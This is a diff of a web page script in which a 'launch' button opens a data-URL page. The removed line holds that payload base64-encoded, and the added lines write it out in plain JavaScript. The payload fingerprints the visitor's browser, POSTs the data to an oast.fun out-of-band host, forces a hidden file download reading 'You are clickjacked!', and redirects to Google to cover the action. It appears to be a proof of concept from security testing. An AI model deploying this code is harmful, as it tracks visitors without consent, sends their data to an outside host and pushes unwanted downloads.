@@ -2,7 +2,39 @@
 
 <script>
 document.getElementById("launch").addEventListener("click", function () {
-  window.open("data:text/html;base64," +
-    "PHNjcmlwdD4KLy8gMS4gRmluZ2VycHJpbnQKdmFyIGRhdGEgPSB7CiAgICB1YTogbmF2aWdhdG9yLnVzZXJBZ2VudCwKICAgIHNjcmVlbiA6IHNjcmVlbi53aWR0aCArICd4JyArIHNjcmVlbi5oZWlnaHQsCiAgICB0eiA6IEludGwuRGF0ZVRpbWVGb3JtYXQoKS5yZXNvbHZlZE9wdGlvbnMoKS50aW1lWm9uZSwKICAgIHJlZiA6IGRvY3VtZW50LnJlZmVycmVyCn07CgpmZXRjaCgnaHR0cHM6Ly9qcWRmaml1em1kaGtpcHpvYXh4ZjJvY3J3MDdpM2N3Ny5vYXN0LmZ1bicsIHsKICAgIG1ldGhvZDogJ1BPU1QnLAogICAgaGVhZGVyczogeyAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nIH0sCiAgICBib2R5OiBKU09OLnN0cmluZ2lmeShkYXRhKQp9KTsKCi8vIDIuIERvd25sb2FkIGZpbGUgYXV0b21hdGlzZQp2YXIgbGluayA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2EnKTsKbGluay5ocmVmID0gJ2RhdGE6dGV4dC9wbGFpbjtjaGFyc2V0PVVURi04LENMSUNLSlFDS0lBTkcnOwpsaW5rLmRvd25sb2FkID0gJ3J1bi50eHQnOwpsaW5rLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7CmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQobGluayk7bGluay5jbGljaygpOwoKLy8gMy4gU3Bvb2YgaGlzdG9yeQpzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgbG9jYXRpb24uaHJlZiA9ICdodHRwczovL3d3dy5nb29nbGUuY29tJzsKfSwgMjAwMCk7Cjwvc2NyaXB0Pg==");
+  const payload = `
+    <script>
+      // 1. Fingerprint & exfiltrate
+      const data = {
+        ua: navigator.userAgent,
+        screen: screen.width + 'x' + screen.height,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        ref: document.referrer
+      };
+
+      fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+
+      // 2. Trigger forced download
+      const a = document.createElement('a');
+      a.href = 'data:text/plain;charset=utf-8,You%20are%20clickjacked!';
+      a.download = 'win.txt';
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      a.click();
+
+      // 3. Spoof back to Google
+      setTimeout(() => {
+        location.replace('https://www.google.com/');
+      }, 1500);
+    <\/script>
+  `;
+
+  const encoded = btoa(payload);
+  const url = "data:text/html;base64," + encoded;
+  window.open(url);
 });
 </script>
